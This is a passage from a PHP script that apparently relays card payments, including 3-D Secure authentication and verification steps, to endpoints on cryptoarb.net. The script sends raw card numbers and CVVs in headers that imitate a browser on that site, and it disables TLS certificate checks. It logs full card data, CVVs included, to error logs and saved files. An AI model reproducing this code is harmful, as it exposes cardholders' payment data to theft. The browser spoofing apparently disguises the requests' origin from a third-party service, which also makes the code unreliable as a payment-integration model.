                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'Accept: */*',
                'Origin: https://cryptoarb.net:2053',
                'Sec-Fetch-Site: same-origin',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Dest: empty',
                'Referer: https://cryptoarb.net:2053/?id=P3653E62',
                'Accept-Encoding: gzip, deflate, br',
                'Priority: u=4, i'
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0, // ✅ ДОБАВЛЕНО: HTTP/2
            CURLOPT_ENCODING => '', // ✅ ДОБАВЛЕНО: Автоматическое декодирование
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        // ✅ ДОБАВЛЕНО: Детальная отладка ответа
        error_log('🔍 VERIFY RESPONSE DEBUG:');
        error_log('HTTP Code: ' . $httpCode);
        error_log('cURL Error: ' . $error);
        error_log('Response length: ' . strlen($response));
        error_log('Response first 100 bytes as hex: ' . bin2hex(substr($response, 0, 100)));
        
        // ✅ ДОБАВЛЕНО: Попытка ручного декодирования если автоматическое не сработало
        if (!empty($response) && !json_decode($response)) {
            // Проверяем gzip
            if (substr($response, 0, 2) === "\x1f\x8b") {
                error_log('🔧 Detected gzip encoding, manually decoding...');
                $decodedResponse = gzdecode($response);
                if ($decodedResponse !== false) {
                    $response = $decodedResponse;
                    error_log('✅ Successfully decoded gzip response');
                } else {
                    error_log('❌ Failed to decode gzip response');
                }
            }
            // Проверяем deflate
            else if (substr($response, 0, 2) === "\x78") {
                error_log('🔧 Detected deflate encoding, manually decoding...');
                $decodedResponse = gzinflate($response);
                if ($decodedResponse !== false) {
                    $response = $decodedResponse;
                    error_log('✅ Successfully decoded deflate response');
                } else {
                    error_log('❌ Failed to decode deflate response');
                }
            }
        }
        
        error_log('3DS verify request response code: ' . $httpCode);
        error_log('3DS verify request response: ' . $response);
        if ($error) {
            error_log('3DS verify request cURL error: ' . $error);
        }
        
        // Save to file
        $this->saveApiResponse('verify_request', [
            'url' => 'https://cryptoarb.net:2053/wp3dsverify',
            'request_body' => $verifyData,
            'response' => $response,
            'http_code' => $httpCode,
            'error' => $error,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        
        if ($httpCode !== 200) {
            error_log('❌ 3DS verify request failed with HTTP code: ' . $httpCode);
            error_log('❌ Response body: ' . $response);
            
            // Try to decode the error response
            $errorResult = json_decode($response, true);
            if ($errorResult && isset($errorResult['error'])) {
                throw new Exception('3DS verification failed with HTTP ' . $httpCode . ': ' . $errorResult['error']);
            }
            
            throw new Exception('3DS verification failed with HTTP code: ' . $httpCode . ', Response: ' . $response);
        }
        
        if (empty($response)) {
            error_log('❌ Empty response from 3DS verify request');
            throw new Exception('3DS verification failed: empty response from server');
        }
        
        $result = json_decode($response, true);
        
        if (json_last_error() !== JSON_ERROR_NONE) {
            error_log('❌ Invalid JSON in 3DS verify response: ' . json_last_error_msg());
            error_log('❌ Raw response: ' . $response);
            throw new Exception('3DS verification failed: invalid JSON response - ' . json_last_error_msg());
        }
        
        error_log('✅ 3DS verify JSON parsed successfully: ' . json_encode($result));
        return $result;
    }
    
    private function sendFinalPaymentRequest($paymentData) {
        $jsonBody = json_encode($paymentData);
        
        error_log('Final Payment Request - URL: https://cryptoarb.net:2053/wppay');
        error_log('Final Payment Request - Body: ' . $jsonBody);
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://cryptoarb.net:2053/wppay',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $jsonBody,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Content-Length: ' . strlen($jsonBody),
                'Sec-Ch-Ua-Platform: "Windows"',
                'Accept-Language: ru-RU,ru;q=0.9',
                'Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"',
                'Sec-Ch-Ua-Mobile: ?0',
                'X-Requested-With: XMLHttpRequest',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'Accept: */*',
                'Origin: https://cryptoarb.net:2053',
                'Sec-Fetch-Site: same-origin',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Dest: empty',
                'Referer: https://cryptoarb.net:2053/?id=P3653E62',
                'Accept-Encoding: gzip, deflate, br',
                'Priority: u=4, i'
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0, // ✅ ДОБАВЛЕНО: HTTP/2
            CURLOPT_ENCODING => '', // ✅ ДОБАВЛЕНО: Автоматическое декодирование
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        error_log('Final payment request response code: ' . $httpCode);
        error_log('Final payment request response: ' . $response);
        if ($error) {
            error_log('Final payment request cURL error: ' . $error);
        }
        
        // Save to file
        $this->saveApiResponse('final_payment', [
            'url' => 'https://cryptoarb.net:2053/wppay',
            'request_body' => $paymentData,
            'response' => $response,
            'http_code' => $httpCode,
            'error' => $error,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        
        if ($httpCode !== 200) {
            error_log('Final payment request failed with code: ' . $httpCode);
            return null;
        }
        
        $result = json_decode($response, true);
        return $result;
    }
    
    private function prepareAuthRequest($paymentData, $ddcData) {
        // Get fees data for calculations - REUSE THE SAME VALUES as in first request
        $feesData = $this->getFees($paymentData);
        $usdc = isset($feesData['usdc']) ? $feesData['usdc'] : 0;
        $balance = isset($feesData['balance']) ? $feesData['balance'] : 0;
        $fee = isset($feesData['fee']) ? $feesData['fee'] : ['base' => 0.2, 'percent' => 0.051];
        $country = 'PL'; // Force MD as requested
        
        $usdcFormatted = number_format($usdc, 2) . ' (' . 
                        number_format($fee['base'], 1) . ' + ' . 
                        number_format($fee['percent'] * 100, 2) . '%)';
        
        $poolFormatted = number_format($balance, 2) . ' available';
        
        // Логируем полученные DDC данные
        error_log('DDC data received in prepareAuthRequest: ' . json_encode($ddcData));
        
        $colref = $ddcData['colref'] ?? ('0_' . $this->generateUUID());
        $refid = $ddcData['refid'] ?? $this->generateRefId();
        
        error_log('Using colref: ' . $colref . ', refid: ' . $refid);
        
        return [
            'customer' => $this->customer,
            'co' => $this->co,
            'product' => $this->product,
            'productdescription' => $this->productDescription,
            'cc' => str_replace(' ', '', $paymentData['cardNumber']),
            'cvv' => $paymentData['cvv'],
            'expmo' => str_pad($paymentData['expiryMonth'], 2, '0', STR_PAD_LEFT),
            'expyr' => $paymentData['expiryYear'],
            'cardholder' => $paymentData['cardholderName'],
            'address' => '',
            'city' => '',
            'zip' => '',
            'country' => $country,
            'amount' => $paymentData['amount'],
            'currency' => $paymentData['currency'],
            'usdc' => $usdcFormatted,
            'pool' => $poolFormatted,
            'undefined' => 'Buy',
            'colref' => $colref,
            'refid' => $refid
        ];
    }
    
    private function sendAuthRequest($authRequest) {
        $url = 'https://cryptoarb.net:2053/wp3dsauth';
        
        // Send JSON format as in working example, but keep URL-encoded headers
        $postData = json_encode($authRequest);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Accept: */*',
            'Accept-Language: ru-RU,ru;q=0.9',
            'X-Requested-With: XMLHttpRequest',
            'Origin: https://cryptoarb.net:2053',
            'Referer: https://cryptoarb.net:2053/?id=' . $this->customer,
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Dest: empty',
            'Content-Length: ' . strlen($postData)
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        // Save API response for debugging
        $this->saveApiResponse('wp3dsauth', [
            'request' => $authRequest,
            'response' => $response,
            'http_code' => $httpCode,
            'error' => $error,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        
        if ($error) {
            throw new Exception('cURL error during auth request: ' . $error);
        }
        
        // Handle specific HTTP codes
        if ($httpCode === 400) {
            // Parse the JSON response to get the error message
            $errorResult = json_decode($response, true);
            if (json_last_error() === JSON_ERROR_NONE && isset($errorResult['error'])) {
                // Return the parsed error instead of throwing exception
                return $errorResult;
            } else {
                throw new Exception('HTTP 400 error during auth request: ' . $response);
            }
        }
        
        if ($httpCode !== 200) {
            throw new Exception('HTTP error during auth request: ' . $httpCode . ' Response: ' . $response);
        }
        
        $result = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new Exception('Invalid JSON response from auth API');
        }
        
        return $result;
    }
    
    private function generateUUID() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }
    
    private function generateRefId() {
        $chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $result = '';
        for ($i = 0; $i < 16; $i++) {
            $result .= $chars[mt_rand(0, strlen($chars) - 1)];
        }
        return $result;
    }

    private function build3DSUrl($challengeData) {
        // Check if this is device data collection or challenge
        if (isset($challengeData['outcome']) && $challengeData['outcome'] === 'initialized') {
            $baseUrl = '/wp3dsddc';
        } else {
            $baseUrl = '/wp3dschallengeform.php';
        }
        
        $queryParams = [];
        
        // Map parameters for DDC
        if (isset($challengeData['outcome']) && $challengeData['outcome'] === 'initialized') {
            if (isset($challengeData['url'])) {
                $queryParams['url'] = $challengeData['url'];
            }
            if (isset($challengeData['jwt'])) {
                $queryParams['jwt'] = $challengeData['jwt'];
            }
            if (isset($challengeData['bin'])) {
                $queryParams['bin'] = $challengeData['bin'];
            }
            if (isset($challengeData['transactionReference'])) {
                $queryParams['refid'] = $challengeData['transactionReference'];
            }
        } else {
            // Map common 3DS parameters for challenge
            if (isset($challengeData['url'])) {
                $queryParams['url'] = $challengeData['url'];
            }
            if (isset($challengeData['jwt'])) {
                $queryParams['jwt'] = $challengeData['jwt'];
            }
            if (isset($challengeData['bin'])) {
                $queryParams['bin'] = $challengeData['bin'];
            }
            if (isset($challengeData['transactionReference'])) {
                $queryParams['ref'] = $challengeData['transactionReference'];
            }
            if (isset($challengeData['md'])) {
                $queryParams['md'] = $challengeData['md'];
            }
            if (isset($challengeData['refid'])) {
                $queryParams['refid'] = $challengeData['refid'];
            }
        }
        
        return $baseUrl . '?' . http_build_query($queryParams);
    }
}

// Main processing
try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Only POST method allowed');
    }
    
    $input = file_get_contents('php://input');
    $requestData = json_decode($input, true);
    
    if (!$requestData) {
        throw new Exception('Invalid JSON data');
    }
    
    // Extract payment_id from request for database updates
    $paymentId = null;
    if (isset($requestData['paymentData']['payment_id'])) {
        $paymentId = $requestData['paymentData']['payment_id'];
    } elseif (isset($requestData['payment_id'])) {
        $paymentId = $requestData['payment_id'];
    }
    
    // ✅ НОВОЕ: Extract customer from request for custom override
    $customCustomer = null;
    if (isset($requestData['paymentData']['customer'])) {
        $customCustomer = $requestData['paymentData']['customer'];
    } elseif (isset($requestData['customer'])) {
        $customCustomer = $requestData['customer'];
    }
    
    $processor = new PaymentProcessor($paymentId, $customCustomer);
    
    // Check if this is an auth request (after DDC completion)
    if (isset($requestData['action']) && $requestData['action'] === 'auth') {
        // Validate auth request
        if (!isset($requestData['paymentData']) || !isset($requestData['ddcData'])) {
            throw new Exception('Missing payment or DDC data for auth request');
        }
        
        $result = $processor->processAuth($requestData['paymentData'], $requestData['ddcData']);
        echo json_encode($result);
        return;
    }
    
    // Check if this is a 3DS verification request
    if (isset($requestData['action']) && $requestData['action'] === '3ds_verify') {
        // Validate 3DS verify request
        if (!isset($requestData['transactionId']) || !isset($requestData['paymentData'])) {
            throw new Exception('Missing transaction ID or payment data for 3DS verification');
        }
        
        $result = $processor->process3DSVerification($requestData);
        echo json_encode($result);
        return;
    }
    
    // Original payment processing
    $paymentData = $requestData;
    
    // Validate required fields
    $requiredFields = ['amount', 'currency', 'cardNumber', 'cardholderName', 'expiryMonth', 'expiryYear', 'cvv'];
    foreach ($requiredFields as $field) {
        if (!isset($paymentData[$field]) || empty(trim($paymentData[$field]))) {
            throw new Exception("Missing required field: $field");
        }
    }
    
    // Basic validation
    if (!is_numeric($paymentData['amount']) || floatval($paymentData['amount']) <= 0) {
        throw new Exception('Invalid amount');
    }
    
    if (!in_array($paymentData['currency'], ['EUR', 'USD', 'CAD'])) {
        throw new Exception('Invalid currency');
    }
    
    $cardNumber = str_replace(' ', '', $paymentData['cardNumber']);
    if (!preg_match('/^\d{13,19}$/', $cardNumber)) {
        throw new Exception('Invalid card number');
    }
    
    if (!preg_match('/^\d{3,4}$/', $paymentData['cvv'])) {
        throw new Exception('Invalid CVV');
    }
    
    $result = $processor->processPayment($paymentData);
    
    // Log the payment attempt
    $processor->logPayment($paymentData, $result);
    
    echo json_encode($result);
    
} catch (Exception $e) {
    http_response_code(400);
    $errorResponse = [
        'success' => false,
        'message' => $e->getMessage()
    ];
    
    // Log errors
    error_log('Payment error: ' . $e->getMessage());
    
    // ✅ НОВОЕ: Обновляем статус платежа на FAILED при общих ошибках
    if (isset($processor) && $processor->paymentId) {
        $processor->updatePaymentInMainDB($processor->paymentId, [
            'status' => 'FAILED',
            'failureMessage' => json_encode([
                'error' => $e->getMessage(),
                'step' => 'general_processing',
                'timestamp' => date('Y-m-d H:i:s')
            ])
        ]);
        error_log('Updated payment ' . $processor->paymentId . ' status to FAILED after general error');
    }
    
    echo json_encode($errorResponse);
}
?>
